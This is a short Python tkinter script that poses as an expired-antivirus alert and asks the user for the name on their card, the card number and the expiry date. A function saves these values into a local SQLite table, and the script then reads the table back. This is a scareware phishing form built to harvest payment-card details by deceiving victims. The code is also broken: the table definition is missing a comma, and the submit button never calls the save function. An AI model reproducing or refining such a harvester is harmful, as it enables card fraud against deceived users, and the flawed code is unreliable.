import tkinter as tk
from tkinter import ttk
import sqlite3
import pandas as pd



sql_connect = sqlite3.connect('database.db')
cur = sql_connect.cursor() # creates a cursor object 

cur.execute('''CREATE TABLE IF NOT EXISTS app_data_credit (
name STRING,
number STRING
date INT
)
''')
sql_connect.commit()



main = tk.Tk() 
label=tk.Label(text="Your antivirus has expird. Enter payment information to update .")

name_label = tk.Label(main, text="Name on Card", #shows text asking name on card
     font=('calibre',14,'normal'))

number_var = tk.StringVar() #Credit card number
date_var = tk.IntVar() #credit card date
name_var = tk.StringVar() # name on card

name_entry = tk.Entry(main, #entry for name
    textvariable = name_var,
    font=('calibre',14,'normal'))  


credit_label = tk.Label(main, text="Credit Card Number", #shows text asking for credit card number
                 font=('helvetica',14,'bold'))

credit_number = tk.Entry(main, # input for number
    textvariable = number_var,
    font=('calibre',14,'normal'))                    


credit_date_label = tk.Label(main, text="Expiration Date",#shows text asking for expiration date
                 font=('helvetica',14,'bold'))

credit_date = tk.Entry(main,  # date entry
        textvariable = date_var,
        font=('calibre',14,'normal'))   


def getInfo():
    #Gets the name number and date  data
    customer_name = name_var.get()
    creditCard_number = number_var.get()
    expirationDate = date_var.get()
    
    
    #Saves your data to your database
    cur.execute("INSERT INTO app_data_credit (name,number,date) VALUES (?,?,?)",
                (customer_name,creditCard_number,expirationDate))
    sql_connect.commit()

    name_var.set("")
    number_var.set("")
    date_var.set("")
    main.destroy()





button = tk.Button(main, text="Please press when done updating payment information", 
    command = main.destroy) #this function closes the windows after pressing the button


label.pack()
name_label.pack()
name_entry.pack()
credit_label.pack()
credit_number.pack()
credit_date_label.pack()
credit_date.pack()
button.pack()
main.mainloop()




pd.read_sql_query('''
    SELECT * FROM app_data_credit;
    ''', sql_connect)




    